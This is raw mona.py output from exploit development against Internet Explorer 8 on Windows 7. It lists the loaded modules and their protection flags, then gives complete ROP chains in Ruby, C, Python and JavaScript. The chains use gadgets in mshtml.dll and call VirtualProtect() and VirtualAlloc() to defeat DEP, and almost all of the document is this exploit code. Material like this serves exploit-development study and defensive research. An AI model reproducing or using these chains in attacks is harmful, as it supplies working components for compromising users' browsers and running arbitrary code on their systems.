-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x6b190000 | 0x6bc10000 | 0x00a80000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [IEFRAME.dll] (C:\Windows\system32\IEFRAME.dll)
 0x74af0000 | 0x74b29000 | 0x00039000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [MMDevAPI.DLL] (C:\Windows\system32\MMDevAPI.DLL)
 0x769b0000 | 0x76ae6000 | 0x00136000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [urlmon.dll] (C:\Windows\system32\urlmon.dll)
 0x749e0000 | 0x749e7000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [AVRT.dll] (C:\Windows\system32\AVRT.dll)
 0x66c60000 | 0x67217000 | 0x005b7000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [mshtml.dll] (C:\Windows\System32\mshtml.dll)
 0x6c010000 | 0x6c040000 | 0x00030000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [wdmaud.drv] (C:\Windows\system32\wdmaud.drv)
 0x75ca0000 | 0x75cec000 | 0x0004c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [apphelp.dll] (C:\Windows\system32\apphelp.dll)
 0x75ef0000 | 0x7600d000 | 0x0011d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [CRYPT32.dll] (C:\Windows\system32\CRYPT32.dll)
 0x75e10000 | 0x75e1c000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [MSASN1.dll] (C:\Windows\system32\MSASN1.dll)
 0x76340000 | 0x76414000 | 0x000d4000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [kernel32.dll] (C:\Windows\system32\kernel32.dll)
 0x76800000 | 0x768ac000 | 0x000ac000 | False  | True    | True  |  True    | True   | 7.0.7600.16385 [msvcrt.dll] (C:\Windows\system32\msvcrt.dll)
 0x75cf0000 | 0x75cfc000 | 0x0000c000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTBASE.dll] (C:\Windows\system32\CRYPTBASE.dll)
 0x6bfc0000 | 0x6bff6000 | 0x00036000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [AUDIOSES.DLL] (C:\Windows\system32\AUDIOSES.DLL)
 0x742c0000 | 0x742d3000 | 0x00013000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [dwmapi.dll] (C:\Windows\system32\dwmapi.dll)
 0x77c50000 | 0x77d8c000 | 0x0013c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x6af00000 | 0x6af2b000 | 0x0002b000 | False  | True    | True  |  True    | False  | 8.0.7601.17514 [ieproxy.dll] (C:\Program Files\Internet Explorer\ieproxy.dll)
 0x76490000 | 0x764a9000 | 0x00019000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [sechost.dll] (C:\Windows\SYSTEM32\sechost.dll)
 0x76430000 | 0x76435000 | 0x00005000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [PSAPI.DLL] (C:\Windows\system32\PSAPI.DLL)
 0x76310000 | 0x7631a000 | 0x0000a000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [LPK.dll] (C:\Windows\system32\LPK.dll)
 0x778b0000 | 0x77aab000 | 0x001fb000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [iertutil.dll] (C:\Windows\system32\iertutil.dll)
 0x6c000000 | 0x6c004000 | 0x00004000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ksuser.dll] (C:\Windows\system32\ksuser.dll)
 0x760a0000 | 0x7613d000 | 0x0009d000 | False  | True    | True  |  True    | True   | 1.626.7601.17514 [USP10.dll] (C:\Windows\system32\USP10.dll)
 0x768b0000 | 0x769a5000 | 0x000f5000 | False  | True    | True  |  True    | True   | 8.0.7601.17514 [WININET.dll] (C:\Windows\system32\WININET.dll)
 0x73760000 | 0x73767000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [WINNSI.DLL] (C:\Windows\system32\WINNSI.DLL)
 0x75c80000 | 0x75c9b000 | 0x0001b000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SspiCli.dll] (C:\Windows\system32\SspiCli.dll)
 0x73770000 | 0x7378c000 | 0x0001c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [iphlpapi.DLL] (C:\Windows\system32\iphlpapi.DLL)
 0x75e80000 | 0x75e92000 | 0x00012000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [DEVOBJ.dll] (C:\Windows\system32\DEVOBJ.dll)
 0x75c60000 | 0x75c68000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [Secur32.dll] (C:\Windows\System32\Secur32.dll)
 0x766a0000 | 0x767fc000 | 0x0015c000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ole32.dll] (C:\Windows\system32\ole32.dll)
 0x77d90000 | 0x77de7000 | 0x00057000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHLWAPI.dll] (C:\Windows\system32\SHLWAPI.dll)
 0x75820000 | 0x75836000 | 0x00016000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [CRYPTSP.dll] (C:\Windows\system32\CRYPTSP.dll)
 0x777e0000 | 0x778a9000 | 0x000c9000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [USER32.dll] (C:\Windows\system32\USER32.dll)
 0x6bfb0000 | 0x6bfb8000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msacm32.drv] (C:\Windows\system32\msacm32.drv)
 0x76320000 | 0x7633f000 | 0x0001f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [IMM32.DLL] (C:\Windows\system32\IMM32.DLL)
 0x77e00000 | 0x77e7b000 | 0x0007b000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [comdlg32.dll] (C:\Windows\system32\comdlg32.dll)
 0x74160000 | 0x7418e000 | 0x0002e000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MLANG.dll] (C:\Windows\system32\MLANG.dll)
 0x67420000 | 0x674d2000 | 0x000b2000 | False  | True    | True  |  True    | True   | 5.8.7601.17514 [jscript.dll] (C:\Windows\System32\jscript.dll)
 0x6ccf0000 | 0x6cd1a000 | 0x0002a000 | False  | True    | True  |  True    | True   | 3.10.349.0 [msls31.dll] (C:\Windows\System32\msls31.dll)
 0x755c0000 | 0x755fb000 | 0x0003b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [rsaenh.dll] (C:\Windows\system32\rsaenh.dll)
 0x6f710000 | 0x6f77f000 | 0x0006f000 | False  | True    | True  |  True    | True   | 8.0.6001.18669 [ieapfltr.dll] (C:\Windows\System32\ieapfltr.dll)
 0x749f0000 | 0x74ae5000 | 0x000f5000 | False  | True    | True  |  True    | True   | 7.0.7601.17514 [propsys.dll] (C:\Windows\system32\propsys.dll)
 0x74970000 | 0x74991000 | 0x00021000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [ntmarta.dll] (C:\Windows\system32\ntmarta.dll)
 0x6bf80000 | 0x6bf87000 | 0x00007000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [midimap.dll] (C:\Windows\system32\midimap.dll)
 0x74910000 | 0x74950000 | 0x00040000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [uxtheme.dll] (C:\Windows\system32\uxtheme.dll)
 0x74960000 | 0x7496b000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [msimtf.dll] (C:\Windows\system32\msimtf.dll)
 0x765b0000 | 0x7663f000 | 0x0008f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [OLEAUT32.dll] (C:\Windows\system32\OLEAUT32.dll)
 0x75da0000 | 0x75dab000 | 0x0000b000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [profapi.dll] (C:\Windows\system32\profapi.dll)
 0x76af0000 | 0x7773a000 | 0x00c4a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SHELL32.dll] (C:\Windows\system32\SHELL32.dll)
 0x76260000 | 0x76301000 | 0x000a1000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [RPCRT4.dll] (C:\Windows\system32\RPCRT4.dll)
 0x76570000 | 0x765a5000 | 0x00035000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ws2_32.DLL] (C:\Windows\system32\ws2_32.DLL)
 0x764b0000 | 0x76533000 | 0x00083000 | False  | True    | True  |  True    | True   | 2001.12.8530.16385 [CLBCatQ.DLL] (C:\Windows\system32\CLBCatQ.DLL)
 0x74b30000 | 0x74cce000 | 0x0019e000 | False  | True    | True  |  True    | True   | 6.10.7601.17514 [comctl32.dll] (C:\Windows\WinSxS\x86_microsoft.windows.common-controls_6595b64144ccf1df_6.0.7601.17514_none_41e6975e2bd6f2b2\comctl32.dll)
 0x6bfb0000 | 0x6bfb8000 | 0x00008000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSACM32.dll] (C:\Windows\system32\msacm32.drv)
 0x76420000 | 0x76426000 | 0x00006000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [NSI.dll] (C:\Windows\system32\NSI.dll)
 0x76440000 | 0x76485000 | 0x00045000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WLDAP32.dll] (C:\Windows\system32\WLDAP32.dll)
 0x76140000 | 0x7620c000 | 0x000cc000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [MSCTF.dll] (C:\Windows\system32\MSCTF.dll)
 0x75ea0000 | 0x75eea000 | 0x0004a000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [KERNELBASE.dll] (C:\Windows\system32\KERNELBASE.dll)
 0x75d00000 | 0x75d5f000 | 0x0005f000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SXS.DLL] (C:\Windows\system32\SXS.DLL)
 0x709b0000 | 0x709e2000 | 0x00032000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [WINMM.dll] (C:\Windows\system32\WINMM.dll)
 0x75d90000 | 0x75d9e000 | 0x0000e000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [RpcRtRemote.dll] (C:\Windows\system32\RpcRtRemote.dll)
 0x75e20000 | 0x75e47000 | 0x00027000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [CFGMGR32.dll] (C:\Windows\system32\CFGMGR32.dll)
 0x76210000 | 0x7625e000 | 0x0004e000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [GDI32.dll] (C:\Windows\system32\GDI32.dll)
 0x756a0000 | 0x756e4000 | 0x00044000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [dnsapi.DLL] (C:\Windows\system32\dnsapi.DLL)
 0x00370000 | 0x00416000 | 0x000a6000 | False  | True    | True  |  False   | False  | 8.0.7601.17514 [iexplore.exe] (C:\Program Files\internet explorer\iexplore.exe)
 0x75150000 | 0x75159000 | 0x00009000 | False  | True    | True  |  True    | True   | 6.1.7600.16385 [VERSION.dll] (C:\Windows\System32\VERSION.dll)
 0x77740000 | 0x777e0000 | 0x000a0000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [ADVAPI32.dll] (C:\Windows\system32\ADVAPI32.dll)
 0x77ab0000 | 0x77c4d000 | 0x0019d000 | False  | True    | True  |  True    | True   | 6.1.7601.17514 [SETUPAPI.dll] (C:\Windows\system32\SETUPAPI.dll)
 0x73d10000 | 0x73d45000 | 0x00035000 | False  | True    | True  |  True    | False  | 8.0.7601.17514 [IEShims.dll] (C:\Program Files\internet explorer\IEShims.dll)
 0x73df0000 | 0x73e2c000 | 0x0003c000 | False  | True    | True  |  True    | True   | 7.0.0.0 [OLEACC.dll] (C:\Windows\system32\OLEACC.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x66d798d4,  # POP EBP # RETN [mshtml.dll] 
      0x66d798d4,  # skip 4 bytes [mshtml.dll]
      0x66dc0eae,  # POP EAX # RETN [mshtml.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x66e036af,  # NEG EAX # RETN [mshtml.dll] 
      0x66ede023,  # XCHG EAX,EBX # RETN [mshtml.dll] 
      0x66fb1277,  # POP EAX # RETN [mshtml.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x670bb98c,  # NEG EAX # RETN [mshtml.dll] 
      0x67028d1b,  # XCHG EAX,EDX # RETN [mshtml.dll] 
      0x66c650b5,  # POP ECX # RETN [mshtml.dll] 
      0x6719cd0b,  # &Writable location [mshtml.dll]
      0x66d8b4ba,  # POP EDI # RETN [mshtml.dll] 
      0x6708a562,  # RETN (ROP NOP) [mshtml.dll]
      0x66e523a0,  # POP ESI # RETN [mshtml.dll] 
      0x66c6c0a3,  # JMP [EAX] [mshtml.dll]
      0x66fb1303,  # POP EAX # RETN [mshtml.dll] 
      0x66c61348,  # ptr to &VirtualProtect() [IAT mshtml.dll]
      0x6717a2c8,  # PUSHAD # RETN [mshtml.dll] 
      0x66d0ee0e,  # ptr to 'jmp esp' [mshtml.dll]
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x66d798d4,  // POP EBP // RETN [mshtml.dll] 
      0x66d798d4,  // skip 4 bytes [mshtml.dll]
      0x66dc0eae,  // POP EAX // RETN [mshtml.dll] 
      0xfffffdff,  // Value to negate, will become 0x00000201
      0x66e036af,  // NEG EAX // RETN [mshtml.dll] 
      0x66ede023,  // XCHG EAX,EBX // RETN [mshtml.dll] 
      0x66fb1277,  // POP EAX // RETN [mshtml.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x670bb98c,  // NEG EAX // RETN [mshtml.dll] 
      0x67028d1b,  // XCHG EAX,EDX // RETN [mshtml.dll] 
      0x66c650b5,  // POP ECX // RETN [mshtml.dll] 
      0x6719cd0b,  // &Writable location [mshtml.dll]
      0x66d8b4ba,  // POP EDI // RETN [mshtml.dll] 
      0x6708a562,  // RETN (ROP NOP) [mshtml.dll]
      0x66e523a0,  // POP ESI // RETN [mshtml.dll] 
      0x66c6c0a3,  // JMP [EAX] [mshtml.dll]
      0x66fb1303,  // POP EAX // RETN [mshtml.dll] 
      0x66c61348,  // ptr to &VirtualProtect() [IAT mshtml.dll]
      0x6717a2c8,  // PUSHAD // RETN [mshtml.dll] 
      0x66d0ee0e,  // ptr to 'jmp esp' [mshtml.dll]
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x66d798d4,  # POP EBP # RETN [mshtml.dll] 
      0x66d798d4,  # skip 4 bytes [mshtml.dll]
      0x66dc0eae,  # POP EAX # RETN [mshtml.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x66e036af,  # NEG EAX # RETN [mshtml.dll] 
      0x66ede023,  # XCHG EAX,EBX # RETN [mshtml.dll] 
      0x66fb1277,  # POP EAX # RETN [mshtml.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x670bb98c,  # NEG EAX # RETN [mshtml.dll] 
      0x67028d1b,  # XCHG EAX,EDX # RETN [mshtml.dll] 
      0x66c650b5,  # POP ECX # RETN [mshtml.dll] 
      0x6719cd0b,  # &Writable location [mshtml.dll]
      0x66d8b4ba,  # POP EDI # RETN [mshtml.dll] 
      0x6708a562,  # RETN (ROP NOP) [mshtml.dll]
      0x66e523a0,  # POP ESI # RETN [mshtml.dll] 
      0x66c6c0a3,  # JMP [EAX] [mshtml.dll]
      0x66fb1303,  # POP EAX # RETN [mshtml.dll] 
      0x66c61348,  # ptr to &VirtualProtect() [IAT mshtml.dll]
      0x6717a2c8,  # PUSHAD # RETN [mshtml.dll] 
      0x66d0ee0e,  # ptr to 'jmp esp' [mshtml.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u98d4%u66d7" + // 0x66d798d4 : ,# POP EBP # RETN [mshtml.dll] 
    "%u98d4%u66d7" + // 0x66d798d4 : ,# skip 4 bytes [mshtml.dll]
    "%u0eae%u66dc" + // 0x66dc0eae : ,# POP EAX # RETN [mshtml.dll] 
    "%ufdff%uffff" + // 0xfffffdff : ,# Value to negate, will become 0x00000201
    "%u36af%u66e0" + // 0x66e036af : ,# NEG EAX # RETN [mshtml.dll] 
    "%ue023%u66ed" + // 0x66ede023 : ,# XCHG EAX,EBX # RETN [mshtml.dll] 
    "%u1277%u66fb" + // 0x66fb1277 : ,# POP EAX # RETN [mshtml.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%ub98c%u670b" + // 0x670bb98c : ,# NEG EAX # RETN [mshtml.dll] 
    "%u8d1b%u6702" + // 0x67028d1b : ,# XCHG EAX,EDX # RETN [mshtml.dll] 
    "%u50b5%u66c6" + // 0x66c650b5 : ,# POP ECX # RETN [mshtml.dll] 
    "%ucd0b%u6719" + // 0x6719cd0b : ,# &Writable location [mshtml.dll]
    "%ub4ba%u66d8" + // 0x66d8b4ba : ,# POP EDI # RETN [mshtml.dll] 
    "%ua562%u6708" + // 0x6708a562 : ,# RETN (ROP NOP) [mshtml.dll]
    "%u23a0%u66e5" + // 0x66e523a0 : ,# POP ESI # RETN [mshtml.dll] 
    "%uc0a3%u66c6" + // 0x66c6c0a3 : ,# JMP [EAX] [mshtml.dll]
    "%u1303%u66fb" + // 0x66fb1303 : ,# POP EAX # RETN [mshtml.dll] 
    "%u1348%u66c6" + // 0x66c61348 : ,# ptr to &VirtualProtect() [IAT mshtml.dll]
    "%ua2c8%u6717" + // 0x6717a2c8 : ,# PUSHAD # RETN [mshtml.dll] 
    "%uee0e%u66d0" + // 0x66d0ee0e : ,# ptr to 'jmp esp' [mshtml.dll]
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x66da5da8,  # POP EBP # RETN [mshtml.dll] 
      0x66da5da8,  # skip 4 bytes [mshtml.dll]
      0x66dc0ebe,  # POP EAX # RETN [mshtml.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x67084a6e,  # NEG EAX # RETN [mshtml.dll] 
      0x67189a2e,  # XCHG EAX,EBX # RETN [mshtml.dll] 
      0x67017125,  # POP EAX # RETN [mshtml.dll] 
      0xa6800fc0,  # put delta into eax (-> put 0x00001000 into edx)
      0x66eff00e,  # ADD EAX,59800040 # RETN [mshtml.dll] 
      0x67028ccd,  # XCHG EAX,EDX # RETN [mshtml.dll] 
      0x66fb140f,  # POP EAX # RETN [mshtml.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x670849f2,  # NEG EAX # RETN [mshtml.dll] 
      0x66f46039,  # XCHG EAX,ECX # RETN [mshtml.dll] 
      0x66d8a6cb,  # POP EDI # RETN [mshtml.dll] 
      0x6708a562,  # RETN (ROP NOP) [mshtml.dll]
      0x67071940,  # POP ESI # RETN [mshtml.dll] 
      0x66c6c0a3,  # JMP [EAX] [mshtml.dll]
      0x66fa1c77,  # POP EAX # RETN [mshtml.dll] 
      0x66c6134c,  # ptr to &VirtualAlloc() [IAT mshtml.dll]
      0x66eadfb8,  # PUSHAD # RETN [mshtml.dll] 
      0x66c9b04f,  # ptr to 'jmp esp' [mshtml.dll]
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x66da5da8,  // POP EBP // RETN [mshtml.dll] 
      0x66da5da8,  // skip 4 bytes [mshtml.dll]
      0x66dc0ebe,  // POP EAX // RETN [mshtml.dll] 
      0xffffffff,  // Value to negate, will become 0x00000001
      0x67084a6e,  // NEG EAX // RETN [mshtml.dll] 
      0x67189a2e,  // XCHG EAX,EBX // RETN [mshtml.dll] 
      0x67017125,  // POP EAX // RETN [mshtml.dll] 
      0xa6800fc0,  // put delta into eax (-> put 0x00001000 into edx)
      0x66eff00e,  // ADD EAX,59800040 // RETN [mshtml.dll] 
      0x67028ccd,  // XCHG EAX,EDX // RETN [mshtml.dll] 
      0x66fb140f,  // POP EAX // RETN [mshtml.dll] 
      0xffffffc0,  // Value to negate, will become 0x00000040
      0x670849f2,  // NEG EAX // RETN [mshtml.dll] 
      0x66f46039,  // XCHG EAX,ECX // RETN [mshtml.dll] 
      0x66d8a6cb,  // POP EDI // RETN [mshtml.dll] 
      0x6708a562,  // RETN (ROP NOP) [mshtml.dll]
      0x67071940,  // POP ESI // RETN [mshtml.dll] 
      0x66c6c0a3,  // JMP [EAX] [mshtml.dll]
      0x66fa1c77,  // POP EAX // RETN [mshtml.dll] 
      0x66c6134c,  // ptr to &VirtualAlloc() [IAT mshtml.dll]
      0x66eadfb8,  // PUSHAD // RETN [mshtml.dll] 
      0x66c9b04f,  // ptr to 'jmp esp' [mshtml.dll]
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x66da5da8,  # POP EBP # RETN [mshtml.dll] 
      0x66da5da8,  # skip 4 bytes [mshtml.dll]
      0x66dc0ebe,  # POP EAX # RETN [mshtml.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x67084a6e,  # NEG EAX # RETN [mshtml.dll] 
      0x67189a2e,  # XCHG EAX,EBX # RETN [mshtml.dll] 
      0x67017125,  # POP EAX # RETN [mshtml.dll] 
      0xa6800fc0,  # put delta into eax (-> put 0x00001000 into edx)
      0x66eff00e,  # ADD EAX,59800040 # RETN [mshtml.dll] 
      0x67028ccd,  # XCHG EAX,EDX # RETN [mshtml.dll] 
      0x66fb140f,  # POP EAX # RETN [mshtml.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x670849f2,  # NEG EAX # RETN [mshtml.dll] 
      0x66f46039,  # XCHG EAX,ECX # RETN [mshtml.dll] 
      0x66d8a6cb,  # POP EDI # RETN [mshtml.dll] 
      0x6708a562,  # RETN (ROP NOP) [mshtml.dll]
      0x67071940,  # POP ESI # RETN [mshtml.dll] 
      0x66c6c0a3,  # JMP [EAX] [mshtml.dll]
      0x66fa1c77,  # POP EAX # RETN [mshtml.dll] 
      0x66c6134c,  # ptr to &VirtualAlloc() [IAT mshtml.dll]
      0x66eadfb8,  # PUSHAD # RETN [mshtml.dll] 
      0x66c9b04f,  # ptr to 'jmp esp' [mshtml.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u5da8%u66da" + // 0x66da5da8 : ,# POP EBP # RETN [mshtml.dll] 
    "%u5da8%u66da" + // 0x66da5da8 : ,# skip 4 bytes [mshtml.dll]
    "%u0ebe%u66dc" + // 0x66dc0ebe : ,# POP EAX # RETN [mshtml.dll] 
    "%uffff%uffff" + // 0xffffffff : ,# Value to negate, will become 0x00000001
    "%u4a6e%u6708" + // 0x67084a6e : ,# NEG EAX # RETN [mshtml.dll] 
    "%u9a2e%u6718" + // 0x67189a2e : ,# XCHG EAX,EBX # RETN [mshtml.dll] 
    "%u7125%u6701" + // 0x67017125 : ,# POP EAX # RETN [mshtml.dll] 
    "%u0fc0%ua680" + // 0xa6800fc0 : ,# put delta into eax (-> put 0x00001000 into edx)
    "%uf00e%u66ef" + // 0x66eff00e : ,# ADD EAX,59800040 # RETN [mshtml.dll] 
    "%u8ccd%u6702" + // 0x67028ccd : ,# XCHG EAX,EDX # RETN [mshtml.dll] 
    "%u140f%u66fb" + // 0x66fb140f : ,# POP EAX # RETN [mshtml.dll] 
    "%uffc0%uffff" + // 0xffffffc0 : ,# Value to negate, will become 0x00000040
    "%u49f2%u6708" + // 0x670849f2 : ,# NEG EAX # RETN [mshtml.dll] 
    "%u6039%u66f4" + // 0x66f46039 : ,# XCHG EAX,ECX # RETN [mshtml.dll] 
    "%ua6cb%u66d8" + // 0x66d8a6cb : ,# POP EDI # RETN [mshtml.dll] 
    "%ua562%u6708" + // 0x6708a562 : ,# RETN (ROP NOP) [mshtml.dll]
    "%u1940%u6707" + // 0x67071940 : ,# POP ESI # RETN [mshtml.dll] 
    "%uc0a3%u66c6" + // 0x66c6c0a3 : ,# JMP [EAX] [mshtml.dll]
    "%u1c77%u66fa" + // 0x66fa1c77 : ,# POP EAX # RETN [mshtml.dll] 
    "%u134c%u66c6" + // 0x66c6134c : ,# ptr to &VirtualAlloc() [IAT mshtml.dll]
    "%udfb8%u66ea" + // 0x66eadfb8 : ,# PUSHAD # RETN [mshtml.dll] 
    "%ub04f%u66c9" + // 0x66c9b04f : ,# ptr to 'jmp esp' [mshtml.dll]
    ""); //  : 


--------------------------------------------------------------------------------------------------

